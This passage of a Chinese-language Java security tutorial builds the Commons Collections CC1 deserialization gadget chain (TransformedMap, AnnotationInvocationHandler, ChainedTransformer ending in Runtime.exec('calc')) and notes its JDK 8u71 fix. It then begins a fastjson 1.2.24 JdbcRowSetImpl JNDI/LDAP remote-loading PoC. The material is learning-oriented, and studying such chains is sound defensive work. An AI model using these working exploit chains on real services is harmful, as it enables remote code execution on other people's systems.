调用setValue()修改值（以age为例）</span><br><span class="line">            if (&quot;age&quot;.equals(key)) &#123;</span><br><span class="line">                entry.setValue(&quot;21&quot;); // 修改value为&quot;21&quot;</span><br><span class="line">                System.out.println(&quot;修改后age的value: &quot; + entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 验证原始Map的值也被修改了（因为共享数据）</span><br><span class="line">        System.out.println(&quot;原始Map中age的值: &quot; + map.get(&quot;age&quot;)); // 输出21</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">总的来说</span><br><span class="line">父类 AbstractInputCheckedMapDecorator 中的 MapEntry 内部类，重写了 Map.Entry 接口的 setValue 方法 **，这才导致它的 setValue 行为和普通 Map（如 HashMap）的 setValue 不同</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public void invokerExec2() throws IOException &#123;</span><br><span class="line">    InvokerTransformer invokerTransformernew =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">    //Map decorate = TransformedMap.decorate(null,null,invokerTransformernew);</span><br><span class="line">    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">    map.put(&quot;a&quot;,&quot;b&quot;);</span><br><span class="line">    Map&lt;Object, Object&gt; decorated = TransformedMap.decorate(map, null, invokerTransformernew);</span><br><span class="line">    //取出decorated中所有的键值对，赋值给entry变量，然后执行循环体（你的代码中是打印entry</span><br><span class="line">    for (Map.Entry&lt;Object, Object&gt; entry : decorated.entrySet()) &#123;</span><br><span class="line">        //System.out.println(entry);</span><br><span class="line">        entry.setValue(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么到了现在我们就又往前推进了一步</p>
+<h4 id="3：谁调用了setvalue"><a href="#3：谁调用了setvalue" class="headerlink" title="3：谁调用了setvalue"></a>3：谁调用了setvalue</h4><p>sun&#x2F;reflect&#x2F;annotation&#x2F;AnnotationInvocationHandler.java 在这个类中</p>
+<p>他实现了Serializable接口</p>
+<p>class AnnotationInvocationHandler implements InvocationHandler, Serializable</p>
+<p>它刚好实现了三个部分</p>
+<p>1.实现了序列化接口</p>
+<p>2.重写了readobject</p>
+<p>3.readobject里面调用了setValue</p>
+<p>那么 memberValue 怎么变成我们上面的增强map呢 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    // Check to make sure that types have not evolved incompatibly</span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">        // Class is no longer an annotation type; time to punch out</span><br><span class="line">        throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    // If there are annotation members without values, that</span><br><span class="line">    // situation is handled by the invoke method.</span><br><span class="line">    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            if (!(memberType.isInstance(value) ||</span><br><span class="line">                  value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看他的构造函数进行传值,但是不是public的我们就用反射来调用出来</p>
+<p>type是注解 比如@type  @restsponce  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    if (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != 1 ||</span><br><span class="line">        superInterfaces[0] != java.lang.annotation.Annotation.class)</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    this.type = type;</span><br><span class="line">    this.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void invokerExec3() throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">    InvokerTransformer invokerTransformernew =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">    //Map decorate = TransformedMap.decorate(null,null,invokerTransformernew);</span><br><span class="line">    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">    map.put(&quot;a&quot;,&quot;b&quot;);</span><br><span class="line">    Map&lt;Object, Object&gt; decorated = TransformedMap.decorate(map, null, invokerTransformernew);</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    declaredConstructor.setAccessible(true);</span><br><span class="line">    Object o = declaredConstructor.newInstance(Target.class, decorated);</span><br><span class="line">    CCtest.serialize(o);</span><br><span class="line">    CCtest.unserialize(&quot;ser.bin&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class CCtest &#123;</span><br><span class="line">   public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">       ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">       objectOutputStream.writeObject(obj);</span><br><span class="line">   &#125;</span><br><span class="line">   public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">       ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">       Object o = objectInputStream.readObject();</span><br><span class="line">       return o;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">    @Test</span><br><span class="line">    public void test() throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        unserialize(&quot;cc1.ser&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们在反序列化会触发readobject 然后我们断点查看是否断下来了</p>
+<p><img src="/../images/cc/5.png" alt="1"></p>
+<p>同时我们要满足IF顺利到达下面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">    String name = memberValue.getKey();</span><br><span class="line">    Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">    if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">        Object value = memberValue.getValue();</span><br><span class="line">        if (!(memberType.isInstance(value) ||</span><br><span class="line">              value instanceof ExceptionProxy)) &#123;</span><br><span class="line">            memberValue.setValue(</span><br><span class="line">                new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                    value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                        annotationType.members().get(name)));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在我们传入的Object o &#x3D; declaredConstructor.newInstance(Target.class, decorated);的target注解里面必须map里面要有这个值比如都有的value所以我们要把key改为value  然后因为key里面不为空所以过了不为null</p>
+<p><img src="/../images/cc/6.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void invokerExec3() throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">    InvokerTransformer invokerTransformernew =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">    //Map decorate = TransformedMap.decorate(null,null,invokerTransformernew);</span><br><span class="line">    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">    map.put(&quot;value&quot;,&quot;b&quot;);</span><br><span class="line">    Map&lt;Object, Object&gt; decorated = TransformedMap.decorate(map, null, invokerTransformernew);</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    declaredConstructor.setAccessible(true);</span><br><span class="line">    Object o = declaredConstructor.newInstance(Target.class, decorated);</span><br><span class="line">    CCtest.serialize(o);</span><br><span class="line">    CCtest.unserialize(&quot;ser.bin&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>AnnotationInvocationHandler</code> 把你传进去的 Map 当成 <code>成员名 -&gt; 值</code> 的映射来处理；</p>
+<p>如果 key 是注解里不存在的名字（<code>memberType == null</code>），JDK 会跳过，不会调用 <code>setValue()</code>；</p>
+<p>所以利用时必须使用注解真实存在的成员名（<code>&quot;value&quot;</code> 是常用且可用的一个）。</p>
+<h4 id="4-setValue值怎么控制"><a href="#4-setValue值怎么控制" class="headerlink" title="4.setValue值怎么控制"></a>4.setValue值怎么控制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (!(memberType.isInstance(value) ||</span><br><span class="line">      value instanceof ExceptionProxy)) &#123;</span><br><span class="line">    memberValue.setValue(</span><br><span class="line">        new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                annotationType.members().get(name)));</span><br><span class="line">      我们到了setvalue后 怎么控制里面的数值呢</span><br></pre></td></tr></table></figure>
+
+<p>我们又找到了一个transformer</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class ConstantTransformer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        return iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">        public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">        super();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">他重写的transformer 无论什么都是返回具体的实例</span><br><span class="line"></span><br><span class="line">        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());</span><br><span class="line">        constantTransformer.transform(null);</span><br><span class="line">        比如这样其他还是Runtime.getRuntime</span><br><span class="line">     </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是这样后你没发现吗 我的exec 和 calc去哪里了？ 这里不就断开了嘛 你拿到了Runtime.getruntime但是方法呢参数呢</p>
+<h4 id="5-chainTransformer-链在一起"><a href="#5-chainTransformer-链在一起" class="headerlink" title="5.chainTransformer 链在一起"></a>5.chainTransformer 链在一起</h4><p>神奇的chaintransformer</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">它的transformer</span><br><span class="line">把多个简单的转换步骤组成一个 “流水线”，上一个转换的输出作为下一个转换的输入</span><br><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">  // 遍历内部存储的所有Transformer（iTransformers是一个Transformer数组）</span><br><span class="line">    for (int i = 0; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        // 关键：将当前object作为输入，调用第i个Transformer的transform方法，</span><br><span class="line">        // 并把返回值重新赋值给object（作为下一个Transformer的输入）</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    return object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>就像invoketransformer.transformer(constantTransformer.transformer)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void invokerExec5() throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">    InvokerTransformer invokerTransformernew =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">    ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());</span><br><span class="line">    ChainedTransformer chainedTransformer =  new ChainedTransformer(new Transformer[]&#123;</span><br><span class="line">            constantTransformer,</span><br><span class="line">            invokerTransformernew</span><br><span class="line">    &#125;);</span><br><span class="line">    chainedTransformer.transform(&quot;test&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们放入代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void invokerExec5() throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">    InvokerTransformer invokerTransformernew =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">    ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());</span><br><span class="line">    ChainedTransformer chainedTransformer =  new ChainedTransformer(new Transformer[]&#123;</span><br><span class="line">            constantTransformer,</span><br><span class="line">            invokerTransformernew</span><br><span class="line">    &#125;);</span><br><span class="line">    //chainedTransformer.transform(&quot;test&quot;);</span><br><span class="line">    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">    map.put(&quot;value&quot;,&quot;b&quot;);</span><br><span class="line">    Map&lt;Object, Object&gt; decorated = TransformedMap.decorate(map, null, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    declaredConstructor.setAccessible(true);</span><br><span class="line">    Object o = declaredConstructor.newInstance(Target.class, decorated);</span><br><span class="line">    CCtest.serialize(o);</span><br><span class="line">    CCtest.unserialize(&quot;ser.bin&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>但是.RUNTIME不能被序列化</p>
+<p>java.io.NotSerializableException: java.lang.Runtime</p>
+<p>但是Class是可以序列化的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public final class Class&lt;T&gt; implements java.io.Serializable,</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过反射来调用runtime</p>
+<p>那么我们要怎么样结合我们上面的transform呢</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class class2 = Runtime.class;</span><br><span class="line">Method getRuntime = class2.getDeclaredMethod(&quot;getRuntime&quot;, null);</span><br><span class="line">getRuntime.setAccessible(true);</span><br><span class="line">Object invoke2 = getRuntime.invoke(null);</span><br><span class="line">//System.out.println(invoke2);</span><br><span class="line"></span><br><span class="line">Method exec = class2.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">exec.invoke(invoke2, &quot;calc&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>答案就是使用invoke反复调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">public void invokerExec5() throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">    //InvokerTransformer invokerTransformernew =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">    //ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());</span><br><span class="line">    ChainedTransformer chainedTransformer =  new ChainedTransformer(new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">    //chainedTransformer.transform(&quot;test&quot;);</span><br><span class="line">    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">    map.put(&quot;value&quot;,&quot;value&quot;);</span><br><span class="line">    Map&lt;Object, Object&gt; decorated = TransformedMap.decorate(map, null, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    declaredConstructor.setAccessible(true);</span><br><span class="line">    Object o = declaredConstructor.newInstance(Target.class, decorated);</span><br><span class="line">    CCtest.serialize(o);</span><br><span class="line">    CCtest.unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Runtime.class（输入） →第一个 transformer 调用getMethod(&quot;getRuntime&quot;) → 得到getRuntime方法的Method对象 →第二个 transformer 调用Method.invoke(null) → 得到Runtime实例 →第三个 transformer 调用Runtime.exec(&quot;calc&quot;) → 执行命令。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new InvokerTransformer(</span><br><span class="line">    &quot;getMethod&quot;,  // 要调用的方法名：Class类的getMethod方法</span><br><span class="line">    new Class[]&#123;String.class, Class[].class&#125;,  // 方法参数类型：getMethod的参数类型</span><br><span class="line">    new Object[]&#123;&quot;getRuntime&quot;, null&#125;  // 方法参数值：要获取的方法名和参数类型数组</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">new InvokerTransformer(</span><br><span class="line">    &quot;invoke&quot;,  // 要调用的方法名：Method类的invoke方法</span><br><span class="line">    new Class[]&#123;Object.class, Object[].class&#125;,  // 方法参数类型：invoke的参数类型</span><br><span class="line">    new Object[]&#123;null, null&#125;  // 方法参数值：调用者实例和方法参数</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">new InvokerTransformer(</span><br><span class="line">    &quot;exec&quot;,  // 要调用的方法名：Runtime类的exec方法</span><br><span class="line">    new Class[]&#123;String.class&#125;,  // 方法参数类型：exec的参数类型</span><br><span class="line">    new Object[]&#123;&quot;calc&quot;&#125;  // 方法参数值：要执行的命令</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/cc/7.png" alt="1"></p>
+<ul>
+<li><strong>修复前（如 8u65）</strong>：<code>readObject</code> 中对 <code>memberValues</code> 的遍历操作（<code>memberValues.entrySet()</code>）会触发 <code>TransformedMap</code> 的 <code>setValue</code> 方法，进而执行恶意 <code>Transformer</code> 链。</li>
+<li><strong>修复后（如 8u71+）</strong>：<code>readObject</code> 方法被重写，不再直接操作 <code>memberValues</code>，而是创建新的 <code>LinkedHashMap</code> 来存储值，彻底阻断了对 <code>TransformedMap</code> 的调用链路。</li>
+</ul>
+<h3 id="二：fastjson-1-2-24"><a href="#二：fastjson-1-2-24" class="headerlink" title="二：fastjson 1.2.24"></a>二：fastjson 1.2.24</h3><p>fastjson 可以通过  json字符串转换为 对象 或者把 对象转换为json字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安装依赖</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-我们准备一个恶意的类"><a href="#1-我们准备一个恶意的类" class="headerlink" title="1:我们准备一个恶意的类"></a>1:我们准备一个恶意的类</h4><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “calc” 使用这个工具来准备</p>
+<p><code>JSON.parseObject</code> 是 fastjson 自带的方法&#96;</p>
+<ul>
+<li>反序列化：<code>JSON.parseObject(jsonStr, 目标类)</code>（JSON 字符串→Java 对象）、<code>JSON.parse(jsonStr)</code>（JSON 字符串→Object）；</li>
+<li>序列化：<code>JSON.toJSONString(对象)</code>（Java 对象→JSON 字符串）。</li>
+</ul>
+<p><strong>Jackson（Spring 默认内置）</strong></p>
+<p>常规核心类：<code>com.fasterxml.jackson.databind.ObjectMapper</code></p>
+<ul>
+<li>功能：Jackson 的核心处理类，通过实例方法实现 JSON 转换，支持复杂对象（如集合、泛型）。</li>
+<li>常用方法：<ul>
+<li>反序列化：<code>objectMapper.readValue(jsonStr, 目标类)</code>（JSON→对象）；</li>
+<li>序列化：<code>objectMapper.writeValueAsString(对象)</code>（对象→JSON）。</li>
+</ul>
+</li>
+</ul>
+<p>内置的</p>
+<ul>
+<li><p><code>javax.json.Json</code>（或<code>jakarta.json.Json</code>，Jakarta EE 中）：用于构建 JSON 读写器；</p>
+</li>
+<li><p><code>javax.json.bind.Jsonb</code>（JSON Binding API）：简化对象与 JSON 的绑定（类似 Jackson&#x2F;Gson）。</p>
+</li>
+<li><p>常用方法：</p>
+<ul>
+<li>反序列化：<code>JsonbBuilder.create().fromJson(jsonStr, 目标类)</code>；</li>
+<li>序列化：<code>JsonbBuilder.create().toJson(对象)</code>。</li>
+</ul>
+</li>
+</ul>
+<p>原理是JSON.parseObject（text ）函数它是讲文本转换为JAVA对象，如果这里可控就可以传入恶意json</p>
+<h4 id="2：看看效果以及poc"><a href="#2：看看效果以及poc" class="headerlink" title="2：看看效果以及poc"></a>2：看看效果以及poc</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class evil &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        String test = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl;\&quot;,&quot; +</span><br><span class="line">                &quot;\&quot;dataSourceName\&quot;:&quot; +</span><br><span class="line">                &quot;\&quot;ldap://xxxxx\&quot;,&quot; +</span><br><span class="line">                &quot;\&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">        JSON.parseObject(test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 